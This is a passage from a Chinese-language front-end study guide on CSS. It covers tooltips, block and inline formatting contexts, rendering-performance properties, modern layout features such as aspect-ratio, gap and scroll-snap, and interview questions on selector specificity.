class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-attr">[data-tooltip]</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>&#125;<br><span class="hljs-selector-attr">[data-tooltip]</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-built_in">attr</span>(data-tooltip);<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#333</span>;<br>  <span class="hljs-attribute">color</span>: white;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">4px</span> <span class="hljs-number">8px</span>;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<br>  <span class="hljs-attribute">white-space</span>: nowrap;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-3-BFC（块级格式化上下文）与-IFC（行内格式化上下文）"><a href="#4-3-BFC（块级格式化上下文）与-IFC（行内格式化上下文）" class="headerlink" title="4.3 BFC（块级格式化上下文）与 IFC（行内格式化上下文）"></a>4.3 BFC（块级格式化上下文）与 IFC（行内格式化上下文）</h2><h3 id="核心概念对比-1"><a href="#核心概念对比-1" class="headerlink" title="核心概念对比"></a>核心概念对比</h3><table><thead><tr><th align="left">特性</th><th align="left">BFC（Block Formatting Context）</th><th align="left">IFC（Inline Formatting Context）</th></tr></thead><tbody><tr><td align="left">布局方向</td><td align="left">垂直排列</td><td align="left">水平排列</td></tr><tr><td align="left">元素类型</td><td align="left">块级元素参与</td><td align="left">行内级元素参与</td></tr><tr><td align="left">宽度计算</td><td align="left">撑满父容器（除非指定宽度）</td><td align="left">由内容决定</td></tr><tr><td align="left">边距处理</td><td align="left">垂直边距可能合并</td><td align="left">水平边距有效，垂直边距不影响行高</td></tr><tr><td align="left">经典应用</td><td align="left">清除浮动&#x2F;防止边距合并</td><td align="left">文字对齐&#x2F;行内元素排列</td></tr></tbody></table><h3 id="BFC-详解（块级格式化上下文）"><a href="#BFC-详解（块级格式化上下文）" class="headerlink" title="BFC 详解（块级格式化上下文）"></a>BFC 详解（块级格式化上下文）</h3><p><strong>触发条件</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 任一条件即可触发 */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* 最纯净的BFC */</span><br>  <span class="hljs-attribute">overflow</span>: hidden;   <span class="hljs-comment">/* 非visible */</span><br>  <span class="hljs-attribute">float</span>: left/right;<br>  <span class="hljs-attribute">position</span>: absolute/fixed;<br>  <span class="hljs-attribute">display</span>: inline-block/table-cell/flex/grid;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>隔离的布局环境：内部元素不会影响外部元素布局，外部浮动不会侵入 BFC 区域</li><li>边距折叠解决：外部元素不再发生边距合并</li><li>包含浮动元素</li></ul><p><strong>示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;bfc-container&quot;&gt; &lt;!-- 触发BFC --&gt;<br>  &lt;div style=&quot;margin: 20px&quot;&gt;&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;!-- 外部元素不再发生边距合并 --&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table; <span class="hljs-comment">/* 创建BFC */</span><br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IFC-详解（行内格式化上下文）"><a href="#IFC-详解（行内格式化上下文）" class="headerlink" title="IFC 详解（行内格式化上下文）"></a>IFC 详解（行内格式化上下文）</h3><p><strong>触发条件</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 默认由行内级元素自动创建 */</span><br><span class="hljs-selector-class">.inline-container</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline/inline-block/inline-flex;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>; <span class="hljs-comment">/* 影响line-height计算 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>核心特性</strong></p><ul><li>行框（line box）概念：每行文本生成一个矩形行框，高度由 <code>line-height</code> 决定</li><li>垂直对齐控制：<code>vertical-align: middle</code> 相对行框对齐</li><li>空白符处理：连续多个空白符合并为单个空格，换行符转为空格</li></ul><h3 id="布局场景对比"><a href="#布局场景对比" class="headerlink" title="布局场景对比"></a>布局场景对比</h3><p><strong>浮动元素处理</strong></p><table><thead><tr><th align="left">方案</th><th align="left">BFC</th><th align="left">IFC</th></tr></thead><tbody><tr><td align="left">效果</td><td align="left">包含浮动，阻止文字环绕</td><td align="left">无法包含浮动，允许文字环绕</td></tr><tr><td align="left">代码</td><td align="left">overflow: hidden</td><td align="left">默认行为</td></tr></tbody></table><p><strong>垂直对齐</strong></p><table><thead><tr><th align="left">方案</th><th align="left">BFC</th><th align="left">IFC</th></tr></thead><tbody><tr><td align="left">控制</td><td align="left">通过margin&#x2F;padding调整</td><td align="left">通过 vertical-align 精确控制</td></tr><tr><td align="left">精度</td><td align="left">整块调整</td><td align="left">像素级对齐</td></tr></tbody></table><h3 id="高频面试"><a href="#高频面试" class="headerlink" title="高频面试"></a>高频面试</h3><p><strong>Q：BFC 如何解决边距合并</strong></p><p>创建独立布局环境，阻断与外部元素的边距折叠</p><p><strong>Q：IFC 中 <code>vertical-align</code> 失效的原因？</strong></p><ul><li>检查元素是否真是行内级（display 值）</li><li>确认父元素有有效 <code>line-height</code></li></ul><p><strong>Q：BFC与display: flow-root的区别？</strong></p><p>flow-root是专为BFC设计的新值，无副作用（不触发滚动条&#x2F;裁剪）</p><h2 id="4-4-CSS-性能优化（will-change、contain、GPU-加速）"><a href="#4-4-CSS-性能优化（will-change、contain、GPU-加速）" class="headerlink" title="4.4 CSS 性能优化（will-change、contain、GPU 加速）"></a>4.4 CSS 性能优化（will-change、contain、GPU 加速）</h2><h3 id="will-change：性能优化预告系统"><a href="#will-change：性能优化预告系统" class="headerlink" title="will-change：性能优化预告系统"></a>will-change：性能优化预告系统</h3><ul><li>作用：预先告知浏览器元素可能发生的变化，让浏览器提前优化</li></ul><p><strong>正确使用姿势</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.optimize</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform, opacity; <span class="hljs-comment">/* 明确指定要变化的属性 */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>&#125;<br><span class="hljs-selector-class">.optimize</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>最佳实践</strong></p><p>（1）适用场景</p><ul><li>复杂动画元素</li><li>即将发生变化的滚动区域</li></ul><p>（2）避坑指南</p><ul><li>不要过度使用（每个页面 &lt;&#x3D; 5 个）</li><li>动画结束后移除（通过 js）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;animationend&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">willChange</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="contain：布局隔离核武器"><a href="#contain：布局隔离核武器" class="headerlink" title="contain：布局隔离核武器"></a>contain：布局隔离核武器</h3><ul><li>作用：限制浏览器重绘&#x2F;回流范围，类似于 React 的 shouldComponentUpdate</li></ul><p><strong>关键属性值</strong></p><table><thead><tr><th align="left">值</th><th align="left">优化方向</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">layout</td><td align="left">隔离布局计算</td><td align="left">频繁移动的独立组件</td></tr><tr><td align="left">paint</td><td align="left">限制绘制区域</td><td align="left">弹窗&#x2F;下拉菜单</td></tr><tr><td align="left">size</td><td align="left">忽略子元素尺寸影响</td><td align="left">固定尺寸容器</td></tr><tr><td align="left">strict</td><td align="left">全部隔离（性能最强）</td><td align="left">复杂动画组件</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.product-card</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict; <span class="hljs-comment">/* 卡片内部变化不影响外部布局 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="GPU加速：复合层优化策略"><a href="#GPU加速：复合层优化策略" class="headerlink" title="GPU加速：复合层优化策略"></a>GPU加速：复合层优化策略</h3><p><strong>GPU 加速的本质</strong></p><p>浏览器将特定元素的渲染工作从 CPU 转移到 GPU 处理，利用图形硬件的并行计算能力。这种优化通过创建独立的复合层实现。</p><p><strong>核心触发条件（chromium 内核为例）</strong></p><p>（1）3D 变换属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.transform-3d</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate3d</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">/* 最常用hack */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotateY</span>(<span class="hljs-number">10deg</span>);        <span class="hljs-comment">/* 任意3D函数 */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">perspective</span>(<span class="hljs-number">500px</span>);    <span class="hljs-comment">/* 景深设置 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>作用机制：强制浏览器将元素视为 3D 空间对象，自动触发层提升</p><p>（2）透明度动画 + 硬件加速</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.fade-in</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: opacity;  <span class="hljs-comment">/* 预先声明 */</span><br>  <span class="hljs-attribute">transition</span>: opacity <span class="hljs-number">0.3s</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>特殊场景：仅当与 transform 或 filter 组合时 GPU 加速才稳定生效</p><p>（3）滤镜效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.filter-gpu</span> &#123;<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">5px</span>);          <span class="hljs-comment">/* 高斯模糊 */</span><br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">saturate</span>(<span class="hljs-number">180%</span>); <span class="hljs-comment">/* 背景滤镜 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>性能警告：filter 属性可能引发重绘（需配合 will-change 优化）</p><p>（4）强制层提升属性</p><table><thead><tr><th align="left">属性</th><th align="left">效果</th><th align="left">推荐指数</th></tr></thead><tbody><tr><td align="left">will-change: transform</td><td align="left">最标准做法</td><td align="left">★★★★★</td></tr><tr><td align="left">backface-visibility: hidden</td><td align="left">旧版兼容方案</td><td align="left">★★★☆☆</td></tr><tr><td align="left">perspective: 1000px</td><td align="left">创建3D上下文</td><td align="left">★★★★☆</td></tr></tbody></table><p><strong>优化原理</strong></p><ul><li>将元素提升到独立复合层</li><li>避免与主线程的布局计算相互阻塞</li></ul><p><strong>浏览器渲染管线分析</strong></p><pre class="mermaid">graph TD    A[Style Recalc] --> B[Layout]    B --> C[Paint]    C --> D[Composite]    D -->|GPU加速| E[Layer Drawing]</pre><p>关键阶段：</p><ul><li>Composite：浏览器决定哪些元素需要独立图层</li><li>Layer Drawing：GPU实际渲染图层</li></ul><p><strong>层创建规则</strong></p><p>（1）显式触发条件</p><ul><li>3D 或透视变换（perspective、transform3d）</li><li>视频&#x2F;canvas&#x2F;webGL 等嵌入式内容</li><li>对 opacity&#x2F;transform 等做 CSS 动画</li><li>具有 filter 或 mask 属性的元素</li></ul><p>（2）隐式触发条件</p><ul><li>重叠元素（z-index 较高可能被提升）</li><li>滚动容器内的固定位置元素</li><li>使用 position:fixed 的元素</li></ul><p><strong>注意事项</strong></p><ul><li>内存消耗：每个复合层约占用 1MB 内存</li><li>层爆炸：避免超过 100 个复合层（chromium 限制）</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 错误：过度创建复合层 */</span><br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>);<br>&#125;<br><br><span class="hljs-comment">/* 正确：合并优化 */</span><br><span class="hljs-selector-class">.optimized-card</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform, box-shadow;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="组合优化方案"><a href="#组合优化方案" class="headerlink" title="组合优化方案"></a>组合优化方案</h3><p>（1）虚拟列表优化</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.list-item</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict;<br>  <span class="hljs-attribute">will-change</span>: transform;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-built_in">var</span>(--pos));<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）高性能动画三件套</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.smooth-animation</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-attribute">will-change</span>: transform;<br>  <span class="hljs-attribute">contain</span>: strict;<br>  <span class="hljs-comment">/* 只使用opacity/transform变化 */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）谷歌Chrome团队建议</p><ul><li>对position: fixed元素始终使用will-change: transform</li><li>滚动容器设置overflow: auto而非scroll（避免常驻层）</li></ul><h2 id="4-5-现代-CSS-特性（aspect-ratio、gap、scroll-snap）"><a href="#4-5-现代-CSS-特性（aspect-ratio、gap、scroll-snap）" class="headerlink" title="4.5 现代 CSS 特性（aspect-ratio、gap、scroll-snap）"></a>4.5 现代 CSS 特性（aspect-ratio、gap、scroll-snap）</h2><h3 id="aspect-ratio：实现元素宽高比的终极解决方案"><a href="#aspect-ratio：实现元素宽高比的终极解决方案" class="headerlink" title="aspect-ratio：实现元素宽高比的终极解决方案"></a>aspect-ratio：实现元素宽高比的终极解决方案</h3><p><strong>基础用法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.media-box</span> &#123;<br>  <span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">16</span>/<span class="hljs-number">9</span>; <span class="hljs-comment">/* 宽度:高度=16:9 */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* 宽度优先，高度自动计算 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>计算规则</strong></p><p>高度 &#x3D; 宽度 x （分母&#x2F;分子）</p><p><strong>特殊场景处理</strong></p><table><thead><tr><th align="left">场景</th><th align="left">解决方案</th></tr></thead><tbody><tr><td align="left">同时设置宽高</td><td align="left">aspect-ratio会覆盖height</td></tr><tr><td align="left">最小&#x2F;最大高度限制</td><td align="left">使用min-height&#x2F;max-height</td></tr><tr><td align="left">替换元素(如img)</td><td align="left">优先使用元素原生宽高比</td></tr></tbody></table><h3 id="gap：取代-margin-的智能间距系统"><a href="#gap：取代-margin-的智能间距系统" class="headerlink" title="gap：取代 margin 的智能间距系统"></a>gap：取代 margin 的智能间距系统</h3><p><strong>多布局通用语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid-layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* 行列间距统一 */</span><br>&#125;<br><br><span class="hljs-selector-class">.flex-layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span>; <span class="hljs-comment">/* 行间距 列间距 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>浏览器兼容策略</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-comment">/* 旧版Grid支持 */</span><br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-comment">/* 标准写法 */</span><br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scroll-snap：精准控制滚动"><a href="#scroll-snap：精准控制滚动" class="headerlink" title="scroll-snap：精准控制滚动"></a>scroll-snap：精准控制滚动</h3><p><strong>完整属性体系</strong></p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">scroll-snap-type</td><td align="left">容器滚动捕捉类型</td><td align="left">x mandatory</td></tr><tr><td align="left">scroll-snap-align</td><td align="left">子项对齐位置</td><td align="left">start center end</td></tr><tr><td align="left">scroll-snap-stop</td><td align="left">是否强制停留</td><td align="left">normal always</td></tr><tr><td align="left">scroll-padding</td><td align="left">滚动视窗内边距</td><td align="left">20px</td></tr></tbody></table><p><strong>横向轮播图实现</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;carousel&quot;&gt;<br>  &lt;div class=&quot;slide&quot;&gt;1&lt;/div&gt;<br>  &lt;div class=&quot;slide&quot;&gt;2&lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.carousel</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">overflow-x</span>: auto;<br>  <span class="hljs-attribute">scroll-snap-type</span>: x mandatory;<br>  <span class="hljs-attribute">scroll-padding</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* 避免内容被遮挡 */</span><br>&#125;<br><br><span class="hljs-selector-class">.slide</span> &#123;<br>  <span class="hljs-attribute">scroll-snap-align</span>: start;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">80vw</span>; <span class="hljs-comment">/* 每屏显示一个 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="浏览器支持与降级方案"><a href="#浏览器支持与降级方案" class="headerlink" title="浏览器支持与降级方案"></a>浏览器支持与降级方案</h3><p><strong>特性检测策略</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS">// 检测<span class="hljs-attribute">aspect-ratio</span>支持<br>const supportsAspectRatio = CSS<span class="hljs-selector-class">.supports</span>(&#x27;<span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">1</span>/<span class="hljs-number">1</span><span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">// 检测gap支持（Flexbox版本）</span><br><span class="hljs-string">const supportsFlexGap = CSS.supports(&#x27;</span>gap: <span class="hljs-number">10px</span><span class="hljs-string">&#x27;, &#x27;</span>display: flex<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p><strong>渐进增强写法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-comment">/* 旧版Flex布局间距 */</span><br>  <span class="hljs-attribute">margin</span>: -<span class="hljs-number">5px</span>;<br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-keyword">@supports</span> (<span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-selector-class">.item</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第五章：CSS-工程化与架构"><a href="#第五章：CSS-工程化与架构" class="headerlink" title="第五章：CSS 工程化与架构"></a>第五章：CSS 工程化与架构</h1><h2 id="5-1-CSS-预处理（Sass-Less-变量、嵌套、Mixin）"><a href="#5-1-CSS-预处理（Sass-Less-变量、嵌套、Mixin）" class="headerlink" title="5.1 CSS 预处理（Sass&#x2F;Less 变量、嵌套、Mixin）"></a>5.1 CSS 预处理（Sass&#x2F;Less 变量、嵌套、Mixin）</h2><h2 id="5-2-CSS-模块化（BEM、CSS-Modules、CSS-in-JS）"><a href="#5-2-CSS-模块化（BEM、CSS-Modules、CSS-in-JS）" class="headerlink" title="5.2 CSS 模块化（BEM、CSS Modules、CSS-in-JS）"></a>5.2 CSS 模块化（BEM、CSS Modules、CSS-in-JS）</h2><h2 id="5-3-PostCSS-与-Autoprefixer"><a href="#5-3-PostCSS-与-Autoprefixer" class="headerlink" title="5.3 PostCSS 与 Autoprefixer"></a>5.3 PostCSS 与 Autoprefixer</h2><h2 id="5-4-原子化-CSS（Tailwind-CSS、UnoCSS）"><a href="#5-4-原子化-CSS（Tailwind-CSS、UnoCSS）" class="headerlink" title="5.4 原子化 CSS（Tailwind CSS、UnoCSS）"></a>5.4 原子化 CSS（Tailwind CSS、UnoCSS）</h2><h2 id="5-5-设计系统与-CSS-架构（主题切换、变量管理）"><a href="#5-5-设计系统与-CSS-架构（主题切换、变量管理）" class="headerlink" title="5.5 设计系统与 CSS 架构（主题切换、变量管理）"></a>5.5 设计系统与 CSS 架构（主题切换、变量管理）</h2><h1 id="第六章：CSS-面试高频考点"><a href="#第六章：CSS-面试高频考点" class="headerlink" title="第六章：CSS 面试高频考点"></a>第六章：CSS 面试高频考点</h1><h2 id="6-1-CSS-优先级与权重深度考察"><a href="#6-1-CSS-优先级与权重深度考察" class="headerlink" title="6.1 CSS 优先级与权重深度考察"></a>6.1 CSS 优先级与权重深度考察</h2><h3 id="基础概念考察"><a href="#基础概念考察" class="headerlink" title="基础概念考察"></a>基础概念考察</h3><p><strong>Q：请解释 CSS 选择器的权重计算规则？</strong></p><p>权重由四个分量组成，按 (a, b, c, d) 计算：</p><ul><li>a：!important（非选择器，单独标记）</li><li>b：ID选择器数量（如 #header）</li><li>c：类&#x2F;伪类&#x2F;属性选择器数量（如 .class, :hover, [type&#x3D;”text”]）</li><li>d：元素&#x2F;伪元素选择器数量（如 div, ::before）</li></ul><p>示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#nav</span> <span class="hljs-selector-class">.item</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">::before</span> &#123;&#125; <span class="hljs-comment">/* 权重：0,1,2,1 */</span><br></code></pre></td></tr></table></figure><p>陷阱：<code>!important</code> 的权重真的最高吗？</p><ul><li>当多个 !important 冲突时，仍需按选择器权重比较</li><li>!important 会破坏样式层叠，应尽量避免</li></ul><h3 id="权重实战考察"><a href="#权重实战考察" class="headerlink" title="权重实战考察"></a>权重实战考察</h3><p><strong>Q：判断以下样式的最终生效颜色？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div id=&quot;box&quot; class=&quot;container warning&quot; style=&quot;color: yellow&quot;&gt;Text&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#box</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;            <span class="hljs-comment">/* A */</span><br><span class="hljs-selector-class">.container</span> &#123; <span class="hljs-attribute">color</span>: blue; &#125;     <span class="hljs-comment">/* B */</span><br><span class="hljs-selector-tag">div</span><span class="hljs-selector-class">.warning</span> &#123; <span class="hljs-attribute">color</span>: green; &#125;   <span class="hljs-comment">/* C */</span><br><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">color</span>: orange <span class="hljs-meta">!important</span>; &#125; <span class="hljs-comment">/* D */</span><br></code></pre></td></tr></table></figure><p>分析过程：</p><ul><li>ABCD 